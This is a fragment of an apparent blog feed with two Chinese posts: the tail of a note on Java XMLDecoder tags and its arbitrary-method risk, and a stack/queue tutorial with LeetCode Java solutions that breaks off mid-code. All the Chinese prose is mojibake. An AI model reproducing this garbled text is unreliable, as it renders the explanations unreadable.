class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;value&gt;</code><br>ç”¨äºåŒ…è£…ç®€å•å€¼æˆ–å­—ç¬¦ä¸²ï¼Œé€šå¸¸å†…åµŒåœ¨å…¶ä»–æ ‡ç­¾ä¸­ï¼Œç”¨äºè®¾ç½®å±æ€§æˆ–æ•°ç»„å€¼ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>123<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;null&gt;</code><br>ç”¨äºè¡¨ç¤º null å€¼ï¼Œå¸¸è§äºè®¾ç½®å¯ä¸ºç©ºçš„å±æ€§æˆ–å¯¹è±¡å¼•ç”¨ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;string&gt;</code><br>ç”¨äºè¡¨ç¤ºå­—ç¬¦ä¸²å€¼ï¼Œç»å¸¸ç”¨äºå±æ€§èµ‹å€¼æˆ–æ–¹æ³•å‚æ•°ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>Example<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;int&gt;</code>, <code>&lt;boolean&gt;</code>, <code>&lt;float&gt;</code>, <code>&lt;double&gt;</code> ç­‰<br>ç”¨äºè¡¨ç¤ºåŸºæœ¬æ•°æ®ç±»å‹çš„å€¼ã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">int</span>&gt;</span>42<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><code>&lt;list&gt;</code><br>ç”¨äºåˆ›å»º <code>List</code> ç±»å‹çš„é›†åˆã€‚<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p><code>XMLDecoder</code> çš„è®¾è®¡åˆè¡·æ˜¯ç”¨äº JavaBeans ç»„ä»¶çš„é…ç½®å’Œå­˜å‚¨ï¼Œå› æ­¤å®ƒåœ¨è§£ææ—¶ä¼šåˆ›å»ºå¹¶æ“ä½œ Java å¯¹è±¡ã€‚ç”±äºå…¶çµæ´»æ€§ï¼Œ<code>XMLDecoder</code> å¯ä»¥è¢«ç”¨æ¥æ‰§è¡Œå¤æ‚çš„æ“ä½œï¼ŒåŒ…æ‹¬è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè¿™å¯èƒ½å¯¼è‡´å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œä½¿ç”¨ <code>XMLDecoder</code> å¤„ç†ä¸å—ä¿¡ä»»çš„ XML æ•°æ®æ—¶å¿…é¡»éå¸¸å°å¿ƒã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘æ ˆä¸é˜Ÿåˆ—</title>
      <link href="/2024/10/22/algorithm/stackandqueue/"/>
      <url>/2024/10/22/algorithm/stackandqueue/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p>é˜Ÿåˆ—æ˜¯å…ˆè¿›å…ˆå‡ºï¼Œæ ˆæ˜¯å…ˆè¿›åå‡ºã€‚<br><img src="/2024/10/22/algorithm/stackandqueue/image.png"></p><p>åœ¨Javaä¸­ï¼Œæ ˆï¼ˆStackï¼‰å’Œé˜Ÿåˆ—ï¼ˆQueueï¼‰ä¹Ÿæ˜¯éå¸¸é‡è¦çš„æ•°æ®ç»“æ„ï¼Œå®ƒä»¬åœ¨Javaé›†åˆæ¡†æ¶ä¸­æœ‰ç€å„è‡ªçš„å®ç°å’Œåº”ç”¨ã€‚è®©æˆ‘ä»¬æ·±å…¥äº†è§£ä¸€ä¸‹Javaä¸­çš„æ ˆå’Œé˜Ÿåˆ—çš„å®ç°åŠå…¶ç‰¹ç‚¹ã€‚</p><h3 id="Javaä¸­çš„æ ˆï¼ˆStackï¼‰"><a href="#Javaä¸­çš„æ ˆï¼ˆStackï¼‰" class="headerlink" title="Javaä¸­çš„æ ˆï¼ˆStackï¼‰"></a>Javaä¸­çš„æ ˆï¼ˆStackï¼‰</h3><p>Javaä¸­çš„<code>Stack</code>ç±»å®ç°äº†ä¸€ä¸ªåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ•°æ®ç»“æ„ã€‚å®ƒç»§æ‰¿è‡ª<code>Vector</code>ï¼Œæä¾›äº†å…è®¸æ•°æ®ä»æ ˆé¡¶æ·»åŠ å’Œç§»é™¤çš„æ–¹æ³•ã€‚ç„¶è€Œï¼Œç”±äº<code>Stack</code>ç±»æ˜¯åŸºäº<code>Vector</code>å®ç°çš„ï¼Œè¿™å¯¼è‡´å®ƒåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¹¶ä¸å®‰å…¨ï¼Œä¸”æ€§èƒ½ä¸æ˜¯æœ€ä¼˜çš„ã€‚å› æ­¤ï¼Œæ¨èä½¿ç”¨æ›´ç°ä»£çš„æ•°æ®ç»“æ„ï¼Œå¦‚<code>Deque</code>æ¥å£ã€‚</p><p>ä¸»è¦æ–¹æ³•ï¼š</p><ul><li><code>push(E item)</code>: å°†å…ƒç´ æ·»åŠ åˆ°æ ˆé¡¶ã€‚</li><li><code>pop()</code>: ç§»é™¤æ ˆé¡¶å…ƒç´ å¹¶è¿”å›è¯¥å…ƒç´ ã€‚</li><li><code>peek()</code>: è¿”å›æ ˆé¡¶å…ƒç´ ä½†ä¸ç§»é™¤ã€‚</li><li><code>empty()</code>: æ£€æŸ¥æ ˆæ˜¯å¦ä¸ºç©ºã€‚</li><li><code>search(Object o)</code>: è¿”å›å¯¹è±¡åœ¨æ ˆä¸­çš„ä½ç½®ï¼Œä»¥1ä¸ºåŸºåº•ã€‚</li></ul><h3 id="Javaä¸­çš„é˜Ÿåˆ—ï¼ˆQueueï¼‰"><a href="#Javaä¸­çš„é˜Ÿåˆ—ï¼ˆQueueï¼‰" class="headerlink" title="Javaä¸­çš„é˜Ÿåˆ—ï¼ˆQueueï¼‰"></a>Javaä¸­çš„é˜Ÿåˆ—ï¼ˆQueueï¼‰</h3><p>åœ¨Javaä¸­ï¼Œ<code>Queue</code>æ¥å£å®šä¹‰äº†é˜Ÿåˆ—çš„åŸºæœ¬æ“ä½œã€‚é˜Ÿåˆ—é€šå¸¸æ˜¯å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰çš„ï¼Œä½†ç‰¹å®šç±»å‹çš„é˜Ÿåˆ—å¦‚ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆPriorityQueueï¼‰åˆ™æ ¹æ®å…ƒç´ çš„è‡ªç„¶é¡ºåºæˆ–æ¯”è¾ƒå™¨æ¥å†³å®šå…ƒç´ çš„å‡ºé˜Ÿé¡ºåºã€‚</p><p>å®ç°ç±»ï¼š</p><ul><li><strong>LinkedList</strong>: å®ç°äº†<code>Queue</code>æ¥å£ï¼Œæä¾›äº†æ ‡å‡†çš„é˜Ÿåˆ—æ“ä½œã€‚å®ƒå…è®¸å…ƒç´ ä¸º<code>null</code>ã€‚</li><li><strong>PriorityQueue</strong>: ä¸€ä¸ªåŸºäºä¼˜å…ˆå †çš„æ— ç•Œé˜Ÿåˆ—ï¼Œå…ƒç´ æ ¹æ®å…¶è‡ªç„¶é¡ºåºæˆ–æ¯”è¾ƒå™¨è¿›è¡Œæ’åºã€‚</li><li><strong>ArrayDeque</strong>: å¦‚æœä½ ä¸éœ€è¦çº¿ç¨‹å®‰å…¨æ€§ï¼Œ<code>ArrayDeque</code>æ˜¯æ¯”<code>LinkedList</code>æ›´é«˜æ•ˆçš„åŒç«¯é˜Ÿåˆ—ï¼ˆDequeï¼‰å®ç°ã€‚</li></ul><p>ä¸»è¦æ–¹æ³•ï¼š</p><ul><li><code>add(E e)</code>: å°†å…ƒç´ æ·»åŠ åˆ°é˜Ÿåˆ—å°¾éƒ¨ã€‚å¦‚æœæˆåŠŸï¼Œè¿”å›<code>true</code>ï¼›å¦‚æœæ²¡æœ‰ç©ºé—´ï¼Œåˆ™æŠ›å‡º<code>IllegalStateException</code>ã€‚</li><li><code>offer(E e)</code>: å°†å…ƒç´ æ·»åŠ åˆ°é˜Ÿåˆ—å°¾éƒ¨ï¼Œå¦‚æœé˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™è¿”å›<code>false</code>ã€‚</li><li><code>remove()</code>: ç§»é™¤é˜Ÿåˆ—å¤´çš„å…ƒç´ ã€‚å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™æŠ›å‡º<code>NoSuchElementException</code>ã€‚</li><li><code>poll()</code>: ç§»é™¤å¹¶è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ã€‚å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™è¿”å›<code>null</code>ã€‚</li><li><code>element()</code>: è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ä½†ä¸ç§»é™¤ã€‚å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™æŠ›å‡º<code>NoSuchElementException</code>ã€‚</li><li><code>peek()</code>: è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ä½†ä¸ç§»é™¤ã€‚å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™è¿”å›<code>null</code>ã€‚</li></ul><p>æ¨èä½¿ç”¨<br>å¯¹äºå¤šæ•°éœ€è¦ä½¿ç”¨æ ˆçš„åœºæ™¯ï¼ŒJavaå®˜æ–¹æ¨èä½¿ç”¨<code>ArrayDeque</code>ã€‚å®ƒæ¯”<code>Stack</code>ç±»æ›´å¿«ï¼Œå› ä¸º<code>ArrayDeque</code>æ˜¯å¾ªç¯æ•°ç»„çš„å½¢å¼å®ç°çš„ï¼Œè¿™ä½¿å¾—å®ƒåœ¨ä¸æ¶‰åŠçº¿ç¨‹å®‰å…¨çš„ç¯å¢ƒä¸­å…·æœ‰æ›´é«˜çš„æ€§èƒ½ã€‚åŒæ ·çš„ï¼Œå¯¹äºé˜Ÿåˆ—æ“ä½œï¼Œ<code>ArrayDeque</code>ä¹Ÿæ˜¯ä¸€ä¸ªä¼˜è‰¯çš„é€‰æ‹©ï¼Œå°¤å…¶æ˜¯å½“ä½ éœ€è¦ä¸€ä¸ªåŒæ—¶æ”¯æŒæ ˆå’Œé˜Ÿåˆ—æ“ä½œçš„é«˜æ•ˆæ•°æ®ç»“æ„æ—¶ã€‚</p><h2 id="232-ç”¨æ ˆå®ç°é˜Ÿåˆ—"><a href="#232-ç”¨æ ˆå®ç°é˜Ÿåˆ—" class="headerlink" title="232.ç”¨æ ˆå®ç°é˜Ÿåˆ—"></a>232.ç”¨æ ˆå®ç°é˜Ÿåˆ—</h2><p>è¯·ä½ ä»…ä½¿ç”¨ä¸¤ä¸ªæ ˆå®ç°å…ˆå…¥å…ˆå‡ºé˜Ÿåˆ—ã€‚é˜Ÿåˆ—åº”å½“æ”¯æŒä¸€èˆ¬é˜Ÿåˆ—æ”¯æŒçš„æ‰€æœ‰æ“ä½œï¼ˆpushã€popã€peekã€emptyï¼‰ï¼š</p><p>å®ç° MyQueue ç±»ï¼š<br>void push(int x) å°†å…ƒç´  x æ¨åˆ°é˜Ÿåˆ—çš„æœ«å°¾<br>int pop() ä»é˜Ÿåˆ—çš„å¼€å¤´ç§»é™¤å¹¶è¿”å›å…ƒç´ <br>int peek() è¿”å›é˜Ÿåˆ—å¼€å¤´çš„å…ƒç´ <br>boolean empty() å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œè¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false</p><p>è¯´æ˜ï¼š<br>ä½  åªèƒ½ ä½¿ç”¨æ ‡å‡†çš„æ ˆæ“ä½œ â€”â€” ä¹Ÿå°±æ˜¯åªæœ‰ push to top, peek&#x2F;pop from top, size, å’Œ is empty æ“ä½œæ˜¯åˆæ³•çš„ã€‚<br>ä½ æ‰€ä½¿ç”¨çš„è¯­è¨€ä¹Ÿè®¸ä¸æ”¯æŒæ ˆã€‚ä½ å¯ä»¥ä½¿ç”¨ list æˆ–è€… dequeï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰æ¥æ¨¡æ‹Ÿä¸€ä¸ªæ ˆï¼Œåªè¦æ˜¯æ ‡å‡†çš„æ ˆæ“ä½œå³å¯ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyQueue</span>();</span><br><span class="line">queue.push(<span class="number">1</span>);</span><br><span class="line">queue.push(<span class="number">2</span>);</span><br><span class="line">queue.peek();  <span class="comment">// è¿”å› 1</span></span><br><span class="line">queue.pop();   <span class="comment">// è¿”å› 1</span></span><br><span class="line">queue.empty(); <span class="comment">// è¿”å› false</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ ˆæ¥æ¨¡æ‹Ÿé˜Ÿåˆ—çš„è¡Œä¸ºï¼Œå¦‚æœä»…ä»…ç”¨ä¸€ä¸ªæ ˆï¼Œæ˜¯ä¸€å®šä¸è¡Œçš„ï¼Œæ‰€ä»¥éœ€è¦ä¸¤ä¸ªæ ˆä¸€ä¸ªè¾“å…¥æ ˆï¼Œä¸€ä¸ªè¾“å‡ºæ ˆï¼Œè¿™é‡Œè¦æ³¨æ„è¾“å…¥æ ˆå’Œè¾“å‡ºæ ˆçš„å…³ç³»ã€‚<br>åœ¨pushæ•°æ®çš„æ—¶å€™ï¼Œåªè¦æ•°æ®æ”¾è¿›è¾“å…¥æ ˆå°±å¥½ï¼Œä½†åœ¨popçš„æ—¶å€™ï¼Œæ“ä½œå°±å¤æ‚ä¸€äº›ï¼Œè¾“å‡ºæ ˆå¦‚æœä¸ºç©ºï¼Œå°±æŠŠè¿›æ ˆæ•°æ®å…¨éƒ¨å¯¼å…¥è¿›æ¥ï¼ˆæ³¨æ„æ˜¯å…¨éƒ¨å¯¼å…¥ï¼‰ï¼Œå†ä»å‡ºæ ˆå¼¹å‡ºæ•°æ®ï¼Œå¦‚æœè¾“å‡ºæ ˆä¸ä¸ºç©ºï¼Œåˆ™ç›´æ¥ä»å‡ºæ ˆå¼¹å‡ºæ•°æ®å°±å¯ä»¥äº†ã€‚<br>æœ€åå¦‚ä½•åˆ¤æ–­é˜Ÿåˆ—ä¸ºç©ºå‘¢ï¼Ÿå¦‚æœè¿›æ ˆå’Œå‡ºæ ˆéƒ½ä¸ºç©ºçš„è¯ï¼Œè¯´æ˜æ¨¡æ‹Ÿçš„é˜Ÿåˆ—ä¸ºç©ºäº†ã€‚<br>åœ¨ä»£ç å®ç°çš„æ—¶å€™ï¼Œä¼šå‘ç°pop() å’Œ peek()ä¸¤ä¸ªå‡½æ•°åŠŸèƒ½ç±»ä¼¼ï¼Œä»£ç å®ç°ä¸Šä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼Œå¯ä»¥æ€è€ƒä¸€ä¸‹å¦‚ä½•æŠŠä»£ç æŠ½è±¡ä¸€ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"></span><br><span class="line">    Stack&lt;Integer&gt; stackIn;</span><br><span class="line">    Stack&lt;Integer&gt; stackOut;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        stackIn = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;(); <span class="comment">// è´Ÿè´£è¿›æ ˆ</span></span><br><span class="line">        stackOut = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;(); <span class="comment">// è´Ÿè´£å‡ºæ ˆ</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        stackIn.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span class="keyword">return</span> stackOut.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span class="keyword">return</span> stackOut.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stackIn.isEmpty() &amp;&amp; stackOut.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¦‚æœstackOutä¸ºç©ºï¼Œé‚£ä¹ˆå°†stackInä¸­çš„å…ƒç´ å…¨éƒ¨æ”¾åˆ°stackOutä¸­</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpstackIn</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!stackOut.isEmpty()) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">while</span>(!stackIn.isEmpty())&#123;</span><br><span class="line">            stackOut.push(stackIn.pop());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="225-ç”¨é˜Ÿåˆ—å®ç°æ ˆ"><a href="#225-ç”¨é˜Ÿåˆ—å®ç°æ ˆ" class="headerlink" title="225. ç”¨é˜Ÿåˆ—å®ç°æ ˆ"></a>225. ç”¨é˜Ÿåˆ—å®ç°æ ˆ</h2><p>è¯·ä½ ä»…ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—å®ç°ä¸€ä¸ªåå…¥å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ ˆï¼Œå¹¶æ”¯æŒæ™®é€šæ ˆçš„å…¨éƒ¨å››ç§æ“ä½œï¼ˆpushã€topã€pop å’Œ emptyï¼‰ã€‚</p><p>å®ç° MyStack ç±»ï¼š<br>void push(int x) å°†å…ƒç´  x å‹å…¥æ ˆé¡¶ã€‚<br>int pop() ç§»é™¤å¹¶è¿”å›æ ˆé¡¶å…ƒç´ ã€‚<br>int top() è¿”å›æ ˆé¡¶å…ƒç´ ã€‚<br>boolean empty() å¦‚æœæ ˆæ˜¯ç©ºçš„ï¼Œè¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚</p><p>æ³¨æ„ï¼š<br>ä½ åªèƒ½ä½¿ç”¨é˜Ÿåˆ—çš„æ ‡å‡†æ“ä½œ â€”â€” ä¹Ÿå°±æ˜¯ push to backã€peek&#x2F;pop from frontã€size å’Œ is empty è¿™äº›æ“ä½œã€‚<br>ä½ æ‰€ä½¿ç”¨çš„è¯­è¨€ä¹Ÿè®¸ä¸æ”¯æŒé˜Ÿåˆ—ã€‚ ä½ å¯ä»¥ä½¿ç”¨ list ï¼ˆåˆ—è¡¨ï¼‰æˆ–è€… dequeï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰æ¥æ¨¡æ‹Ÿä¸€ä¸ªé˜Ÿåˆ— , åªè¦æ˜¯æ ‡å‡†çš„é˜Ÿåˆ—æ“ä½œå³å¯ã€‚</p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>é˜Ÿåˆ—æ¨¡æ‹Ÿæ ˆï¼Œå…¶å®ä¸€ä¸ªé˜Ÿåˆ—å°±å¤Ÿäº†ï¼Œä¸€ä¸ªé˜Ÿåˆ—åœ¨æ¨¡æ‹Ÿæ ˆå¼¹å‡ºå…ƒç´ çš„æ—¶å€™åªè¦å°†é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ï¼ˆé™¤äº†æœ€åä¸€ä¸ªå…ƒç´ å¤–ï¼‰ é‡æ–°æ·»åŠ åˆ°é˜Ÿåˆ—å°¾éƒ¨ï¼Œæ­¤æ—¶å†å»å¼¹å‡ºå…ƒç´ å°±æ˜¯æ ˆçš„é¡ºåºäº†ã€‚<br>ä½†é¢˜ç›®è¦æ±‚ä¸¤ä¸ªé˜Ÿåˆ—æ¨¡æ‹Ÿï¼Œé˜Ÿåˆ—æ˜¯å…ˆè¿›å…ˆå‡ºçš„è§„åˆ™ï¼ŒæŠŠä¸€ä¸ªé˜Ÿåˆ—ä¸­çš„æ•°æ®å¯¼å…¥å¦ä¸€ä¸ªé˜Ÿåˆ—ä¸­ï¼Œæ•°æ®çš„é¡ºåºå¹¶æ²¡æœ‰å˜ï¼Œå¹¶æ²¡æœ‰å˜æˆå…ˆè¿›åå‡ºçš„é¡ºåºã€‚<br>æ‰€ä»¥ç”¨æ ˆå®ç°é˜Ÿåˆ—ï¼Œ å’Œç”¨é˜Ÿåˆ—å®ç°æ ˆçš„æ€è·¯è¿˜æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿™å–å†³äºè¿™ä¸¤ä¸ªæ•°æ®ç»“æ„çš„æ€§è´¨ã€‚<br>ä½†æ˜¯ä¾ç„¶è¿˜æ˜¯è¦ç”¨ä¸¤ä¸ªé˜Ÿåˆ—æ¥æ¨¡æ‹Ÿæ ˆï¼Œåªä¸è¿‡æ²¡æœ‰è¾“å…¥å’Œè¾“å‡ºçš„å…³ç³»ï¼Œè€Œæ˜¯å¦ä¸€ä¸ªé˜Ÿåˆ—å®Œå…¨ç”¨æ¥å¤‡ä»½çš„ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyStack</span> &#123;</span><br><span class="line">    Queue&lt;Integer&gt; queue1;</span><br><span class="line">    Queue&lt;Integer&gt; queue2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyStack</span><span class="params">()</span> &#123;</span><br><span class="line">        queue1 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue2 = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        queue2.offer(x); <span class="comment">// å…ˆæ”¾åœ¨è¾…åŠ©é˜Ÿåˆ—ä¸­</span></span><br><span class="line">        <span class="keyword">while</span>(!queue1.isEmpty())&#123;</span><br><span class="line">            queue2.offer(queue1.poll());</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;Integer&gt; queueTemp;</span><br><span class="line">        queueTemp = queue1;</span><br><span class="line">        queue1 = queue2;</span><br><span class="line">        queue2 = queueTemp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queue1.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="20-æœ‰æ•ˆçš„æ‹¬å·"><a href="#20-æœ‰æ•ˆçš„æ‹¬å·" class="headerlink" title="20. æœ‰æ•ˆçš„æ‹¬å·"></a>20. æœ‰æ•ˆçš„æ‹¬å·</h2><p>ç»™å®šä¸€ä¸ªåªåŒ…æ‹¬ â€˜(â€˜ï¼Œâ€™)â€™ï¼Œâ€™{â€˜ï¼Œâ€™}â€™ï¼Œâ€™[â€˜ï¼Œâ€™]â€™ çš„å­—ç¬¦ä¸² s ï¼Œåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆã€‚</p><p>æœ‰æ•ˆå­—ç¬¦ä¸²éœ€æ»¡è¶³ï¼š<br>å·¦æ‹¬å·å¿…é¡»ç”¨ç›¸åŒç±»å‹çš„å³æ‹¬å·é—­åˆã€‚<br>å·¦æ‹¬å·å¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºé—­åˆã€‚<br>æ¯ä¸ªå³æ‹¬å·éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„ç›¸åŒç±»å‹çš„å·¦æ‹¬å·ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Deque&lt;Character&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;(); <span class="comment">// Deque ç”¨åŒç«¯é˜Ÿåˆ—è§£å†³ Queue æ˜¯javaä¸­çš„æ™®é€šé˜Ÿåˆ—</span></span><br><span class="line">        <span class="type">char</span> ch;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; s.length(); i++)&#123;</span><br><span class="line">            ch = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span>(ch == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">                deque.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;&#123;&#x27;</span>)&#123;</span><br><span class="line">                deque.push(<span 